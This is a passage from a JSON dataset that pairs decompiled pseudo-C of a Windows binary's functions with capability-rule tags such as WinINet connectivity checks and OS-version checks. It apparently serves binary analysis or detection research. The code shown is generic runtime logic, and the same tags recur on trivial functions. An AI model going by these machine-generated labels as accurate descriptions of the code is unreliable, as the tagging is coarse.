= iVar13 + 1;\n            goto code_r0x004712b3;\n        }\ncode_r0x00471326:\n        *(unaff_EBP + -0x7e) = 1;\ncode_r0x0047132a:\n        *(unaff_EBP + -4) = 1;\n        if (0xf < uVar7) {\n            *(unaff_EBP + -0x94) = iVar8;\n            *(unaff_EBP + -0x88) = uVar7 + 1;\n            if (0xfff < uVar7 + 1) {\n                fcn.0040411a(unaff_EBP + -0x94, unaff_EBP + -0x88);\n                iVar8 = *(unaff_EBP + -0x94);\n            }\n            fcn.00401a2d(iVar8);\n        }\n        uVar14 = *(unaff_EBP + -0x84);\n    }\n    if ((*(unaff_EBP + -0x7d) != '\\0') && (*(unaff_EBP + -0x90) == 0)) {\n        *puVar15 = 0x30;\n        puVar15 = puVar15 + 1;\n        *(unaff_EBP + -0x98) = puVar15;\n    }\n    cVar4 = fcn.0040650f(uVar14);\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        iVar10 = *(iVar2 + 6);\n        iVar5 = fcn.00403b8e();\n        if (iVar10 == iVar5) {\n            puVar9 = fcn.00401357();\n            *puVar15 = **puVar9;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x98) = puVar15;\n            fcn.004027f7();\n        }\n        uVar14 = *(unaff_EBP + -0x84);\n    }\n    if (*(unaff_EBP + -0x90) == 0) {\n        cVar4 = fcn.0040650f(uVar14);\n        if (cVar4 == '\\0') {\n            iVar13 = *(unaff_EBP + -0x8c);\n            do {\n                if (*(iVar2 + 4) == '\\0') {\n                    fcn.00405141();\n                }\n                if (*(iVar2 + 6) != *(unaff_EBP + -0x4c)) break;\n                *(unaff_EBP + -0x7d) = 1;\n                iVar13 = iVar13 + -1;\n                fcn.004027f7();\n                cVar4 = fcn.0040650f(uVar14);\n            } while (cVar4 == '\\0');\n            *(unaff_EBP + -0x8c) = iVar13;\n            puVar15 = *(unaff_EBP + -0x98);\n        }\n        iVar13 = *(unaff_EBP + -0x8c);\n        if (iVar13 < 0) {\n            *puVar15 = 0x30;\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x8c) = iVar13 + 1;\n        }\n    }\n    while (cVar4 = fcn.0040650f(uVar14),  cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        uVar7 = fcn.00402068(unaff_EBP + -0x4c, *(iVar2 + 6));\n        if (0x15 < uVar7) break;\n        iVar13 = *(unaff_EBP + -0x90);\n        if (iVar13 < *(unaff_EBP + -0xa0)) {\n            *puVar15 = *(uVar7 + 0x55486c);\n            puVar15 = puVar15 + 1;\n            *(unaff_EBP + -0x90) = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.004027f7();\n    }\n    cVar4 = *(unaff_EBP + -0x7d);\n    puVar16 = puVar15;\n    if (cVar4 == '\\0') goto code_r0x00471680;\n    cVar4 = fcn.0040650f(uVar14);\n    if (cVar4 != '\\0') {\ncode_r0x0047167d:\n        cVar4 = *(unaff_EBP + -0x7d);\ncode_r0x00471680:\n        if ((*(unaff_EBP + -0x7e) != '\\0') || (cVar4 == '\\0')) {\n            puVar16 = *(unaff_EBP + -0x9c);\n        }\n        puVar9 = *(unaff_EBP + -0xac);\n        uVar14 = *(unaff_EBP + -0x8c);\n        *puVar16 = 0;\n        *puVar9 = uVar14;\n        fcn.00402a0e();\n        fcn.004068fc();\n        return;\n    }\n    if (*(iVar2 + 4) == '\\0') {\n        fcn.00405141();\n    }\n    iVar10 = *(iVar2 + 6);\n    if (iVar10 != *(unaff_EBP + -0x16)) {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405141();\n            iVar10 = *(iVar2 + 6);\n        }\n        if (iVar10 != *(unaff_EBP + -0x18)) goto code_r0x0047167d;\n    }\n    *puVar15 = 0x70;\n    puVar16 = puVar15 + 1;\n    fcn.004027f7();\n    *(unaff_EBP + -0x7d) = 0;\n    iVar13 = 0;\n    cVar4 = fcn.0040650f(*(unaff_EBP + -0x84));\n    if (cVar4 == '\\0') {\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        iVar10 = *(iVar2 + 6);\n        if (iVar10 == *(unaff_EBP + -0x1e)) {\n            *puVar16 = 0x2b;\n        }\n        else {\n            if (*(iVar2 + 4) == '\\0') {\n                fcn.00405141();\n                iVar10 = *(iVar2 + 6);\n            }\n            if (iVar10 != *(unaff_EBP + -0x20)) goto code_r0x004715d8;\n            *puVar16 = 0x2d;\n        }\n        puVar16 = puVar15 + 1;\n        fcn.004027f7();\n    }\ncode_r0x004715d8:\n    cVar4 = fcn.0040650f(*(unaff_EBP + -0x84));\n    if (cVar4 == '\\0') {\n        do {\n            cVar1 = *(iVar2 + 4);\n            cVar4 = *(unaff_EBP + -0x7d);\n            *(unaff_EBP + -0x7d) = cVar4;\n            if (cVar1 == '\\0') {\n                fcn.00405141();\n                cVar4 = *(unaff_EBP + -0x7d);\n            }\n            if (*(iVar2 + 6) != *(unaff_EBP + -0x4c)) {\n                if (cVar4 == '\\0') goto code_r0x0047162f;\n                break;\n            }\n            *(unaff_EBP + -0x7d) = 1;\n            fcn.004027f7();\n            cVar4 = fcn.0040650f(*(unaff_EBP + -0x84));\n        } while (cVar4 == '\\0');\n        *puVar16 = 0x30;\n        puVar16 = puVar16 + 1;\n    }\ncode_r0x0047162f:\n    do {\n        cVar4 = fcn.0040650f(*(unaff_EBP + -0x84));\n        if (cVar4 != '\\0') goto code_r0x0047167d;\n        if (*(iVar2 + 4) == '\\0') {\n            fcn.00405141();\n        }\n        uVar7 = fcn.00402068(unaff_EBP + -0x4c, *(iVar2 + 6));\n        if (0x15 < uVar7) goto code_r0x0047167d;\n        if (iVar13 < 8) {\n            *puVar16 = *(uVar7 + 0x55486c);\n            puVar16 = puVar16 + 1;\n            iVar13 = iVar13 + 1;\n        }\n        *(unaff_EBP + -0x7d) = 1;\n        fcn.004027f7();\n    } while( true );\n}\n",
        "token_count": 5291
    },
    "00404651": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00404651(uint16_t *arg_8h, int32_t arg_ch, uint16_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uint16_t *puVar3;\n    char cVar4;\n    uint *puVar5;\n    uint16_t uVar6;\n    int32_t iVar7;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_14h;\n    uint32_t var_10h;\n    uint16_t *var_ch;\n    int32_t var_8h;\n    \n    if ((arg_8h == NULL) || (arg_ch == 0)) {\n        puVar5 = fcn.00403a35();\n        *puVar5 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    *arg_8h = 0;\n    if (arg_10h == NULL) {\n        puVar5 = fcn.00403a35();\n        *puVar5 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    fcn.004058a8(arg_1ch);\n    if (arg_18h == 0) {\n        arg_18h = *(var_1ch + 0x9c);\n    }\n    iVar7 = 0;\n    var_ch = arg_8h;\n    var_8h = arg_ch;\n    if (arg_ch != 0) {\n        do {\n            uVar2 = var_10h;\n            uVar6 = *arg_10h;\n            if (uVar6 == 0) break;\n            if (uVar6 == 0x25) {\n                if (arg_14h == 0) goto code_r0x004beffe;\n                var_10h = var_10h & 0xffffff00;\n                uVar6 = arg_10h[1];\n                puVar3 = arg_10h + 1;\n                if (uVar6 == 0x23) {\n                    var_10h = CONCAT31(SUB43(uVar2, 1), 1);\n                    uVar6 = arg_10h[2];\n                    puVar3 = arg_10h + 2;\n                }\n                arg_10h = puVar3;\n                if ((uVar6 == 0x45) || (uVar6 == 0x4f)) {\n                    arg_10h = arg_10h + 1;\n                    uVar6 = *arg_10h;\n                }\n                cVar4 = fcn.004bcf5c(&var_1ch, uVar6, arg_14h, &var_ch, &var_8h, arg_18h, var_10h);\n                if (cVar4 == '\\0') {\n                    if (var_8h == 0) goto code_r0x004befe2;\n                    bVar1 = true;\n                    goto code_r0x004befe4;\n                }\n            }\n            else {\n                *var_ch = uVar6;\n                var_ch = var_ch + 1;\n                var_8h = var_8h + -1;\n            }\n            arg_10h = arg_10h + 1;\n        } while (var_8h != 0);\n        if (var_8h != 0) {\n            *var_ch = 0;\n            iVar7 = arg_ch - var_8h;\n            goto code_r0x004bf00e;\n        }\n    }\ncode_r0x004befe2:\n    bVar1 = false;\ncode_r0x004befe4:\n    *arg_8h = 0;\n    if ((bVar1) || (var_8h != 0)) {\ncode_r0x004beffe:\n        puVar5 = fcn.00403a35();\n        *puVar5 = 0x16;\n        fcn.004037ce();\n    }\n    else {\n        puVar5 = fcn.00403a35();\n        *puVar5 = 0x22;\n    }\ncode_r0x004bf00e:\n    if (var_14h != '\\0') {\n        *(var_20h + 0x350) = *(var_20h + 0x350) & 0xfffffffd;\n    }\n    return iVar7;\n}\n",
        "token_count": 999
    },
    "00404688": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404688(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040117c(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "004046b5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004046b5(uint *arg_8h)\n\n{\n    bool bVar1;\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    fcn.00405498(&var_10h);\n    fcn.0040330f(&var_8h, 0x7b);\n    bVar1 = false;\n    while( true ) {\n        if (bVar1) {\n            fcn.00403d55(0x2c);\n        }\n        arg_8h_00 = fcn.00403e8b(&var_10h);\n        fcn.00402eeb(arg_8h_00);\n        if (**0x574458 != '@') break;\n        if ((*0x574458)[1] == '@') {\n            *0x574458 = *0x574458 + 2;\n            fcn.00403d55(0x7d);\n            *arg_8h = var_8h;\n            arg_8h[1] = var_4h;\n            return arg_8h;\n        }\n        bVar1 = true;\n        *0x574458 = *0x574458 + 1;\n    }\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    *(arg_8h + 1) = 2;\n    return arg_8h;\n}\n",
        "token_count": 355
    },
    "004046fb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004046fb(uint arg_8h)\n\n{\n    int32_t iStack60;\n    int32_t iStack56;\n    \n    for (iStack56 = 0x28; 0 < iStack56; iStack56 = iStack56 + -1) {\n    }\n    for (iStack60 = 0x1d; 0 < iStack60; iStack60 = iStack60 + -1) {\n    }\n    fcn.00403b02(&arg_8h);\n    return;\n}\n",
        "token_count": 119
    },
    "00404714": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00404714(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0xffffffff;\n    uStack24 = 0x4270a0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    fcn.0040620d(0);\n    fcn.00406235();\n    fcn.00406235();\n    fcn.0040264e();\n    fcn.0040264e();\n    fcn.00406235();\n    fcn.00406235();\n    if (param_2 != 0) {\n        uStack20 = 6;\n        fcn.00406217(param_1, param_2);\n        *in_FS_OFFSET = piStack28;\n        return param_1;\n    }\n    uStack20 = 6;\n    fcn.004025a9(0x5462c8);\n    uVar1 = fcn.00402c98();\n    return uVar1;\n}\n",
        "token_count": 261
    },
    "00404741": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar * __cdecl fcn.00404741(uint arg_8h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char **ppcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char **ppcVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.004058a8(arg_8h);\n    pcVar7 = NULL;\n    iVar10 = 0xc;\n    ppcVar3 = *(var_14h + 0x9c) + 0x68;\n    ppcVar8 = ppcVar3;\n    do {\n        pcVar5 = ppcVar8[-0xc];\n        pcVar4 = pcVar5 + 1;\n        do {\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar5 + 1;\n        } while (cVar1 != '\\0');\n        pcVar6 = *ppcVar8;\n        pcVar9 = pcVar6 + 1;\n        do {\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        ppcVar8 = ppcVar8 + 1;\n        pcVar7 = pcVar5 + pcVar6 + pcVar7 + (-pcVar9 - pcVar4) + 2;\n        iVar10 = iVar10 + -1;\n    } while (iVar10 != 0);\n    pcVar4 = fcn.0040409d(pcVar7 + 1);\n    if (pcVar4 != NULL) {\n        var_8h = 0;\n        pcVar5 = pcVar4;\n        do {\n            *pcVar5 = ':';\n            pcVar9 = pcVar5 + 1;\n            iVar10 = fcn.0040605a(pcVar9, pcVar4 + pcVar7 + (1 - pcVar9), ppcVar3[-0xc]);\n            if (iVar10 != 0) {\ncode_r0x004bcb5b:\n                fcn.0040366b(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                pcVar7 = (*pcVar2)();\n                return pcVar7;\n            }\n            pcVar6 = pcVar9;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            pcVar9 = pcVar9 + (pcVar6 - (pcVar5 + 2));\n            *pcVar9 = ':';\n            pcVar5 = pcVar9 + 1;\n            iVar10 = fcn.0040605a(pcVar5, pcVar4 + pcVar7 + (1 - pcVar5), *ppcVar3);\n            if (iVar10 != 0) goto code_r0x004bcb5b;\n            pcVar6 = pcVar5;\n            do {\n                cVar1 = *pcVar6;\n                pcVar6 = pcVar6 + 1;\n            } while (cVar1 != '\\0');\n            pcVar5 = pcVar5 + (pcVar6 - (pcVar9 + 2));\n            ppcVar3 = ppcVar3 + 1;\n            var_8h = var_8h + 1;\n        } while (var_8h < 0xc);\n        *pcVar5 = '\\0';\n    }\n    fcn.0040640b(0);\n    if (var_ch != '\\0') {\n        *(var_18h + 0x350) = *(var_18h + 0x350) & 0xfffffffd;\n    }\n    return pcVar4;\n}\n",
        "token_count": 890
    },
    "0040475f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040475f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    code *pcVar3;\n    char cVar4;\n    int16_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t unaff_EBP;\n    int32_t iVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_28h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00405434(0x44);\n    piVar2 = *(unaff_EBP + 0x14);\n    iVar7 = 0;\n    iVar10 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x34) = *(unaff_EBP + 8);\n    iVar5 = *piVar2;\n    *(unaff_EBP + -0x48) = *(unaff_EBP + 0xc);\n    iVar1 = iVar5;\n    while (iVar1 != 0) {\n        if (iVar1 == iVar5) {\n            iVar10 = iVar10 + 1;\n        }\n        iVar7 = iVar7 + 1;\n        iVar1 = piVar2[iVar7];\n    }\n    *(unaff_EBP + -0x3c) = iVar10;\n    fcn.0040375b(iVar10, 0);\n    *(unaff_EBP + -4) = 1;\n    uVar6 = fcn.00404f70(1);\n    *(unaff_EBP + -0x4c) = uVar6;\n    *(unaff_EBP + -4) = 2;\n    uVar6 = fcn.0040347c(unaff_EBP + -0x50);\n    *(unaff_EBP + -0x38) = uVar6;\n    *(unaff_EBP + -4) = 0;\n    fcn.00405146();\n    *(unaff_EBP + -0x40) = 0xfffffffe;\n    uVar9 = 1;\n    *(unaff_EBP + -0x30) = 1;\n    while( true ) {\n        uVar11 = 0;\n        iVar10 = 0;\n        *(unaff_EBP + -0x29) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        if (*(unaff_EBP + -0x3c) == 0) break;\n        do {\n            iVar5 = piVar2[iVar10];\n            if (iVar5 != 0) {\n                do {\n                    if (iVar5 == *piVar2) break;\n                    iVar10 = iVar10 + 1;\n                    iVar5 = piVar2[iVar10];\n                } while (iVar5 != 0);\n            }\n            bVar12 = 0xf < *(unaff_EBP + -0x14);\n            iVar7 = unaff_EBP + -0x28;\n            if (0xf < *(unaff_EBP + -0x14)) {\n                iVar7 = *(unaff_EBP + -0x28);\n            }\n            if (*(iVar7 + uVar11) == '\\0') {\n                iVar10 = iVar10 + uVar9;\n                if ((piVar2[iVar10] == *piVar2) || (piVar2[iVar10] == 0)) {\n                    if (0x7e < uVar9) {\n                        uVar9 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (bVar12) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar11) = uVar9;\n                    uVar9 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -0x40) = uVar11;\n                    goto code_r0x0046a582;\n                }\n                cVar4 = fcn.00401a8c(*(unaff_EBP + -0x48));\n                if (cVar4 != '\\0') {\ncode_r0x0046a547:\n                    uVar9 = *(unaff_EBP + -0x30);\n                    uVar8 = uVar9;\n                    if (0x7e < uVar9) {\n                        uVar8 = 0x7f;\n                    }\n                    iVar7 = unaff_EBP + -0x28;\n                    if (0xf < *(unaff_EBP + -0x14)) {\n                        iVar7 = *(unaff_EBP + -0x28);\n                    }\n                    *(iVar7 + uVar11) = uVar8;\n                    goto code_r0x0046a582;\n                }\n                if (*(unaff_EBP + 0x18) == '\\x01') {\n                    if (*(*(unaff_EBP + -0x34) + 4) == '\\0') {\n                        fcn.00405d21();\n                    }\n                    bVar12 = piVar2[iVar10] == *(*(unaff_EBP + -0x34) + 6);\n                }\n                else {\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x20);\n                    (**0x578000)(piVar2[iVar10]);\n                    uVar9 = (*pcVar3)();\n                    iVar7 = *(unaff_EBP + -0x34);\n                    *(unaff_EBP + -0x4c) = uVar9 & 0xffff;\n                    if (*(iVar7 + 4) == '\\0') {\n                        fcn.00405d21();\n                    }\n                    pcVar3 = *(**(unaff_EBP + -0x38) + 0x20);\n                    (**0x578000)(*(iVar7 + 6));\n                    iVar5 = (*pcVar3)();\n                    uVar11 = *(unaff_EBP + -0x44);\n                    bVar12 = *(unaff_EBP + -0x4c) == iVar5;\n                }\n                if (!bVar12) goto code_r0x0046a547;\n                uVar9 = *(unaff_EBP + -0x30);\n                cVar4 = '\\x01';\n                *(unaff_EBP + -0x29) = 1;\n            }\n            else {\n                iVar7 = unaff_EBP + -0x28;\n                if (bVar12) {\n                    iVar7 = *(unaff_EBP + -0x28);\n                }\n                iVar10 = iVar10 + *(iVar7 + uVar11);\ncode_r0x0046a582:\n                cVar4 = *(unaff_EBP + -0x29);\n            }\n            uVar11 = uVar11 + 1;\n            *(unaff_EBP + -0x44) = uVar11;\n        } while (uVar11 < *(unaff_EBP + -0x3c));\n        if ((cVar4 == '\\0') || (cVar4 = fcn.00401a8c(*(unaff_EBP + -0x48)),  cVar4 != '\\0')) break;\n        *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 1;\n        fcn.00404863();\n        *(unaff_EBP + -0x40) = 0xffffffff;\n        uVar9 = *(unaff_EBP + -0x30);\n    }\n    fcn.00402a0e();\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 1786
    },
    "0040478c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.0040478c(uint arg_8h)\n\n{\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    for (var_10h = 0x48; 0 < var_10h; var_10h = var_10h + -1) {\n    }\n    for (var_14h = 1; 0 < var_14h; var_14h = var_14h + -1) {\n    }\n    fcn.00403b02(&stack0x00000008, var_14h, var_10h, 0x1c1);\n    return *0x5469c4;\n}\n",
        "token_count": 235
    },
    "004047cd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004047cd(int16_t *arg_8h, int32_t arg_ch, int16_t *arg_10h, int32_t arg_14h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uStack24;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        if (arg_8h == NULL) {\n            if (arg_ch == 0) {\n                return 0;\n            }\n        }\n        else {\ncode_r0x004cd51e:\n            if (arg_ch != 0) {\n                piVar3 = arg_8h;\n                iVar5 = arg_ch;\n                if ((arg_14h == 0) || (arg_10h != NULL)) {\n                    do {\n                        if (*piVar3 == 0) break;\n                        piVar3 = piVar3 + 1;\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                    if (iVar5 != 0) {\n                        if (arg_14h == -1) {\n                            iVar4 = arg_10h - piVar3;\n                            do {\n                                iVar1 = *(iVar4 + piVar3);\n                                *piVar3 = iVar1;\n                                piVar3 = piVar3 + 1;\n                                if (iVar1 == 0) break;\n                                iVar5 = iVar5 + -1;\n                            } while (iVar5 != 0);\n                        }\n                        else {\n                            iVar4 = arg_14h;\n                            if (arg_14h != 0) {\n                                do {\n                                    iVar1 = *arg_10h;\n                                    arg_10h = arg_10h + 1;\n                                    *piVar3 = iVar1;\n                                    piVar3 = piVar3 + 1;\n                                    if ((iVar1 == 0) || (iVar5 = iVar5 + -1,  iVar5 == 0)) break;\n                                    iVar4 = iVar4 + -1;\n                                } while (iVar4 != 0);\n                            }\n                            if (iVar4 == 0) {\n                                *piVar3 = 0;\n                            }\n                        }\n                        if (iVar5 != 0) {\n                            return 0;\n                        }\n                        if (arg_14h == -1) {\n                            arg_8h[arg_ch + -1] = 0;\n                            return 0x50;\n                        }\n                        *arg_8h = 0;\n                        puVar2 = fcn.00403a35();\n                        uStack24 = 0x22;\n                        goto code_r0x004cd53c;\n                    }\n                }\n                *arg_8h = 0;\n            }\n        }\n    }\n    else if (arg_8h != NULL) goto code_r0x004cd51e;\n    puVar2 = fcn.00403a35();\n    uStack24 = 0x16;\ncode_r0x004cd53c:\n    *puVar2 = uStack24;\n    fcn.004037ce();\n    return uStack24;\n}\n",
        "token_count": 688
    },
    "004047e1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_16h\n\nvoid __cdecl fcn.004047e1(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_78h;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.00405434(0x88);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x88) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x80) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.00405466(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x578000)(unaff_EBP + -0x78);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x68) == 0) {\n        *(unaff_EBP + -0x90) = 0;\n    }\n    else {\n        uVar12 = fcn.004017d0();\n        *(unaff_EBP + -0x90) = uVar12 & 0xffff;\n    }\n    piVar5 = fcn.0040347c(*(unaff_EBP + -0x80));\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x578000)(\"0123456789ABCDEFabcdef-+Xx\", 0x55485f, unaff_EBP + -0x48);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x94);\n    *(unaff_EBP + -0x84) = puVar10;\n    cVar3 = fcn.00401a8c(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.00405d21();\n        }\n        iVar4 = *(iVar8 + 6);\n        if (iVar4 == *(unaff_EBP + -0x1a)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.00405d21();\n                iVar4 = *(iVar8 + 6);\n            }\n            if (iVar4 != *(unaff_EBP + -0x1c)) goto code_r0x00472b00;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x84) = puVar10 + 1;\n        fcn.00404863();\n    }\ncode_r0x00472b00:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -0x80) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x7a) = 0;\n    cVar3 = fcn.00401a8c(*(unaff_EBP + -0x88));\n    if (cVar3 == '\\0') 